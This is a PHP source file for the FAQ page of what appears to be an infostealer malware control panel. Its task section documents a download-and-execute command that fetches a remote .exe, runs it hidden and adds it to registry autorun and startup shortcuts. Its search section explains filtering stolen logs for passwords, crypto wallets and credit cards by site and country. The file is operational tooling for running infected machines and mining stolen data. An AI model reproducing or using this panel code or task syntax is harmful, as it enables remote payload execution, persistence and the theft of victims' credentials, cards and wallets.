<?php
/*
	FAQ Page
*/

$pageName = "FAQ";

session_start();
error_reporting(0);

require("app/config.php");

if($config["db_server"] == null)
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/install');
	exit(0);
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
	exit(0);
}

$type = checkParam($_GET["type"]);

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

require("template/header.tmpl.php");

?>
	
	<?
	
	if($type == "tasks")
	{
	
	?>
	
	<div class="col-sm-9 u-ml-auto u-mr-auto">
        <section class="c-article-section">
            <h1 class="">How to use Tasks</h1>
			
			<h4>Example Download&Execute Script</h4>
			<p class="u-h5 u-text-mute">This task download all type file from remote server, save to input directory, execute file, add this to startup from regedit and create autoload shortcut.</p>
			
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">install;http://yourdomain.com/file.exe;file.exe;run;hide;add_to_regedit;create_autoload_shortcut;</code>
			<br>
			<br>
			<table class="c-table u-mb-small">
				<thead class="c-table__head c-table__head--slim">
					<tr class="c-table__row">
						<th class="c-table__cell c-table__cell--head u-border-right">Param</th>
						<th class="c-table__cell c-table__cell--head">Description</th>
					</tr>
				</thead>
				
				<tbody>
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">install</code>
						</td>
						<td class="c-table__cell">Task type</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">http://yourdomain.com/file.exe</code>
						</td>
						<td class="c-table__cell">Full path to file in web</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">file.exe</code>
						</td>
						<td class="c-table__cell">File name to save in PC</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">run / drop</code>
						</td>
						<td class="c-table__cell">run - run after download, drop - none</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">hide / show</code>
						</td>
						<td class="c-table__cell">hide - run app hide, show - rin app show</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">add_to_regedit / drop</code>
						</td>
						<td class="c-table__cell">add_to_regedit - add to autoload current user, drop - none</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">create_autoload_shortcut / drop</code>
						</td>
						<td class="c-table__cell">create_autoload_shortcut - create autoload shortcut for current user, drop - none</td>
					</tr>
					
                </tbody>
            </table>
			
			<h4>Example Open URL Script</h4>
			<p class="u-h5 u-text-mute">This task opening your URL in default system browser.</p>
			
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">open_url;https://google.com</code>
			<br>
			<br>
			
			<table class="c-table u-mb-small">
				<thead class="c-table__head c-table__head--slim">
					<tr class="c-table__row">
						<th class="c-table__cell c-table__cell--head u-border-right">Param</th>
						<th class="c-table__cell c-table__cell--head">Description</th>
					</tr>
				</thead>
				
				<tbody>
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">open_url</code>
						</td>
						<td class="c-table__cell">Task type</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">https://google.com</code>
						</td>
						<td class="c-table__cell">Your URL to open in browser</td>
					</tr>
					
                </tbody>
            </table>
			
			
			<br>
			<br>
			<br>
			<br>
			<br>
			<br>
			
        </section>
	</div>
	
	<? 
	}
	
	if($type == "search")
	{
		?>
		<div class="col-sm-9 u-ml-auto u-mr-auto">
        <section class="c-article-section">
            <h1 class="">How to use Search</h1>
			
			
			<table class="c-table u-mb-small">
				<thead class="c-table__head c-table__head--slim">
					<tr class="c-table__row">
						<th class="c-table__cell c-table__cell--head u-border-right">Param</th>
						<th class="c-table__cell c-table__cell--head">Description</th>
					</tr>
				</thead>
				
				<tbody>
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">site:</code>
						</td>
						<td class="c-table__cell">Search by url from passwords.log</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">WALLET:</code>
						</td>
						<td class="c-table__cell">Search by count wallets.</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">CC:</code>
						</td>
						<td class="c-table__cell">Search by count credit cards.</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">COUNTRY:</code>
						</td>
						<td class="c-table__cell">Search by country / countries.</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">PASSWORDS:</code>
						</td>
						<td class="c-table__cell">Search by passwords.</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">FILES:</code>
						</td>
						<td class="c-table__cell">Search by files.</td>
					</tr>
					
					<tr class="c-table__row">
						<td class="c-table__cell u-border-right">
							<code class="c-code">PROFILE:</code>
						</td>
						<td class="c-table__cell">Search by profile.</td>
					</tr>
					
                </tbody>
            </table>
			
			<h4>Examples</h4>
			<p class="u-h5 u-text-mute" >This examples queries for search engine</p>
			
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">site:blockchain.info</code>
			<br>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">CC:1</code>
			<br>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">CC:>1</code>
			<br>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">WALLET:1</code>
			<br>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">WALLET:>1</code>
			<br>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">COUNTRY:US</code>
			<br>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">COUNTRY:US,UK</code>
			<br>
			<br>
			<p class=" u-h5 u-text-mute" >Using multiple functions</p>
			<code style="padding: 4px 5px; border-radius: 4px; background-color: #EFF3F6; color: #df5000; font-family: $code-font-family; font-size: 16px;">CC:>1 COUNTRY:US,UK site:walmart.com</code>
			<br>
			
        </section>
	</div>
		<?
		
	}
	?>
	
	<script src="js/main.min.js?v=1.4"></script>
</div>
    </body>
</html>